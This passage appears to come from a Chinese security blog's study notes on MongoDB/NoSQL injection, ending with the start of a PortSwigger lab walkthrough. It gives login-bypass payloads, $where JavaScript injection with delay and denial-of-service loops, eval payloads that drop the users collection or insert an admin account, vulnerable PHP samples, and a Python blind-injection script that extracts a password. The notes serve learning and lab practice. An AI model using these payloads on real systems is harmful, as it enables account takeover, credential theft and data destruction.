+{&ldquo;username&rdquo;:{&quot;$regex&quot;:&ldquo;admin.*&rdquo;},
+&ldquo;password&rdquo;:{&quot;$ne&quot;:&quot;&quot;}}
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql62.png"
+        srcset="/img/nosql-inject/nosql62.png, /img/nosql-inject/nosql62.png 1.5x, /img/nosql-inject/nosql62.png 2x"
+        alt="/img/nosql-inject/nosql62.png"
+        title="/img/nosql-inject/nosql62.png" ></figure></p>
+<p>可以看见也是成功登录</p>
+<p>这里也吧M师傅的JavaScript注入的一些笔记写进来，因为算是同一个知识点了只不过师傅用的是where这个方法</p>
+<p>example：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">db</span><span class="o">.</span><span class="nx">users</span><span class="o">.</span><span class="nx">find</span><span class="p">({</span> <span class="nv">$where</span><span class="o">:</span> <span class="s2">&#34;function(){return(this.username == </span><span class="si">$userData</span><span class="s2">)}&#34;</span> <span class="p">})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>构造延迟：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">db</span><span class="o">.</span><span class="nx">users</span><span class="o">.</span><span class="nx">find</span><span class="p">({</span> <span class="nv">$where</span><span class="o">:</span> <span class="s2">&#34;function(){return(this.username == &#39;a&#39;; sleep(5000))}&#34;</span> <span class="p">})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><strong>MongoDB 2.4 之前</strong></li>
+</ul>
+<p>在 MongoDB 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令可以访问到 Mongo Shell 中的全局函数和属性，如 <code>db</code>，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。</p>
+<p>如下所示，发送以下数据后，如果有回显的话将获取当前数据库下所有的集合名：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">password</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;;(function(){return(tojson(db.getCollectionNames()))})();var a=&#39;</span><span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><strong>MongoDB 2.4 之后</strong></li>
+</ul>
+<p>MongoDB 2.4 之后 <code>db</code> 属性访问不到了，但我们应然可以构造万能密码。如果此时我们发送以下这几种数据：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">password</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;;return true//
+</span></span></span><span class="line"><span class="cl"><span class="s1">或
+</span></span></span><span class="line"><span class="cl"><span class="s1">username=1&amp;password=1&#39;</span><span class="p">;</span><span class="k">return</span> <span class="k">true</span><span class="p">;</span><span class="k">var</span> <span class="nx">a</span><span class="o">=</span><span class="err">&#39;</span><span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也是可以查出所有信息的
+DOS的一个playload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">password</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;;(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date&lt;5000); return Math.max();})();var a=&#39;</span><span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也就是一直循环嘛</p>
+<h3 id="联合查询注入" class="headerLink">
+    <a href="#%e8%81%94%e5%90%88%e6%9f%a5%e8%af%a2%e6%b3%a8%e5%85%a5" class="header-mark"></a>联合查询注入</h3><p>假设后端的 MongoDB 查询语句使用了字符串拼接：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">string</span> <span class="nx">query</span> <span class="o">=</span><span class="s2">&#34;{ username: &#39;&#34;</span> <span class="o">+</span> <span class="nv">$username</span> <span class="o">+</span> <span class="s2">&#34;&#39;, password: &#39;&#34;</span> <span class="o">+</span> <span class="nv">$password</span> <span class="o">+</span> <span class="s2">&#34;&#39; }&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当用户正确的用户名密码进行登录时，得到的查询语句是应该这样的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="o">:</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="o">:</span><span class="s1">&#39;123456&#39;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果此时没有很好地对用户的输入进行过滤或者效验，那攻击者便可以构造如下 payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">username</span><span class="o">=</span><span class="nx">admin</span><span class="s1">&#39;, $or: [ {}, {&#39;</span><span class="nx">a</span><span class="s1">&#39;: &#39;</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">password</span><span class="o">=</span><span class="s1">&#39; }], $comment: &#39;</span><span class="mi">123456</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>拼接入查询语句后相当于执行了：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="nv">$or</span><span class="o">:</span> <span class="p">[</span> <span class="p">{},</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="o">:</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;&#39;</span> <span class="p">}],</span> <span class="nv">$comment</span><span class="o">:</span> <span class="s1">&#39;123456&#39;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此时，只要用户名是正确的，这个查询就可以成功。这种手法和 SQL 注入比较相似：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="nx">logins</span> <span class="nx">where</span> <span class="nx">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span> <span class="k">and</span> <span class="p">(</span><span class="nx">password</span> <span class="k">true</span><span class="o">&lt;&gt;</span> <span class="k">or</span> <span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">=</span><span class="s1">&#39;a&#39;</span> <span class="k">and</span> <span class="nx">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样，原本正常的查询语句会被转换为忽略密码的，在无需密码的情况下直接登录用户账号，因为 <code>()</code> 内的条件总是永真的。</p>
+<h3 id="使用-command-方法造成的注入" class="headerLink">
+    <a href="#%e4%bd%bf%e7%94%a8-command-%e6%96%b9%e6%b3%95%e9%80%a0%e6%88%90%e7%9a%84%e6%b3%a8%e5%85%a5" class="header-mark"></a>使用 Command 方法造成的注入</h3><p>懒了，这里也是直接贴出来</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$manager</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Manager</span><span class="p">(</span><span class="s2">&#34;mongodb://127.0.0.1:27017&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Command</span><span class="p">(</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;eval&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;db.users.distinct(&#39;username&#39;,{&#39;username&#39;:&#39;</span><span class="si">$username</span><span class="s2">&#39;})&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeCommand</span><span class="p">(</span><span class="s1">&#39;test.users&#39;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$count</span> <span class="o">=</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$user</span> <span class="o">=</span> <span class="p">((</span><span class="k">array</span><span class="p">)</span><span class="nv">$user</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;====Login Success====&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;username:&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;password:&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Login Failed&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>playload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;});db.users.drop();db.user.find({&#39;</span><span class="nx">username</span><span class="s1">&#39;:&#39;</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;});db.users.insert({&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:123456&#34;});db.users.find({&#39;</span><span class="nx">username</span><span class="s1">&#39;:&#39;</span><span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="盲注" class="headerLink">
+    <a href="#%e7%9b%b2%e6%b3%a8" class="header-mark"></a>盲注</h3><h4 id="布尔盲注" class="headerLink">
+    <a href="#%e5%b8%83%e5%b0%94%e7%9b%b2%e6%b3%a8" class="header-mark"></a>布尔盲注</h4><p>index.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$manager</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Manager</span><span class="p">(</span><span class="s2">&#34;mongodb://127.0.0.1:27017&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Query</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="nv">$username</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="nv">$password</span>
+</span></span><span class="line"><span class="cl"><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeQuery</span><span class="p">(</span><span class="s1">&#39;test.users&#39;</span><span class="p">,</span> <span class="nv">$query</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$count</span> <span class="o">=</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$user</span> <span class="o">=</span> <span class="p">((</span><span class="k">array</span><span class="p">)</span><span class="nv">$user</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;====Login Success====&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;username:&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;password:&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Login Failed&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>判断playload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">username</span><span class="o">=</span><span class="nx">admin</span><span class="o">&amp;</span><span class="nx">password</span><span class="p">[</span><span class="nv">$regex</span><span class="p">]</span><span class="o">=.</span><span class="p">{</span><span class="nx">number</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>附上m师傅的盲注脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://192.168.226.148/index.php&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="s1">&#39;#&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="s1">&#39;$&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1"># When the method is GET</span>
+</span></span><span class="line"><span class="cl">            <span class="n">get_payload</span> <span class="o">=</span> <span class="s1">&#39;?username=admin&amp;password[$regex]=^</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># When the method is POST</span>
+</span></span><span class="line"><span class="cl">            <span class="n">post_payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;password[$regex]&#34;</span><span class="p">:</span> <span class="s1">&#39;^&#39;</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="n">c</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># When the method is POST with JSON</span>
+</span></span><span class="line"><span class="cl">            <span class="n">json_payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;{&#34;username&#34;:&#34;admin&#34;, &#34;password&#34;:{&#34;$regex&#34;:&#34;^</span><span class="si">%s</span><span class="s2">&#34;}}&#34;&#34;&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">#headers = {&#39;Content-Type&#39;: &#39;application/json&#39;}</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">#r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s1">&#39;Login Success&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">c</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 输出如下: </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 1</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 12</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 123</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 1234</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 12345</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] 123456</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="时间盲注" class="headerLink">
+    <a href="#%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8" class="header-mark"></a>时间盲注</h4><p>一些playload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;</span><span class="si">$where</span><span class="s2">&#34;</span><span class="o">:</span> <span class="s2">&#34;sleep(5000)&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">admin</span><span class="s1">&#39;+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]===&#34;a&#34;) &amp;&amp; waitTill &gt; new Date()){};}(this)+&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">admin</span><span class="s1">&#39;+function(x){if(x.password[0]===&#34;a&#34;){sleep(5000)};}(this)+&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="portwigger-lab" class="headerLink">
+    <a href="#portwigger-lab" class="header-mark"></a>portwigger-lab</h1><h3 id="利用nosql-注入提取数据" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8nosql-%e6%b3%a8%e5%85%a5%e6%8f%90%e5%8f%96%e6%95%b0%e6%8d%ae" class="header-mark"></a>利用NoSQL 注入提取数据</h3><p>首先进来还是利用之前给的号进入
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql6.png"
+        srcset="/img/nosql-inject/nosql6.png, /img/nosql-inject/nosql6.png 1.5x, /img/nosql-inject/nosql6.png 2x"
+        alt="/img/nosql-inject/nosql6.png"
+        title="/img/nosql-inject/nosql6.png" ></figure></p>
+<p>发现有个lookup的文件进行搜索user：
+<a href="https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener" target="_blank" rel="noopener noreferrer">https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener</a>
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql7.png"
+        srcset="/img/nosql-inject/nosql7.png, /img/nosql-inject/nosql7.png 1.5x, /img/nosql-inject/nosql7.png 2x"
+        alt="/img/nosql-inject/nosql7.png"
+        title="/img/nosql-inject/nosql7.png" ></figure>
+所以这里就尝试判断注入是否存在
+playload：
+<a href="https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener%27" target="_blank" rel="noopener noreferrer">https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener'</a>
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql8.png"
+        srcset="/img/nosql-inject/nosql8.png, /img/nosql-inject/nosql8.png 1.5x, /img/nosql-inject/nosql8.png 2x"
+        alt="/img/nosql-inject/nosql8.png"
+        title="/img/nosql-inject/nosql8.png" ></figure>
+<a href="https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener%27" target="_blank" rel="noopener noreferrer">https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener'</a> &amp;&amp; &lsquo;1&rsquo;==&lsquo;1
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql9.png"
+        srcset="/img/nosql-inject/nosql9.png, /img/nosql-inject/nosql9.png 1.5x, /img/nosql-inject/nosql9.png 2x"
+        alt="/img/nosql-inject/nosql9.png"
+        title="/img/nosql-inject/nosql9.png" ></figure>
+正常，所以判断是有注入的，那么这里如何获取数据呢？
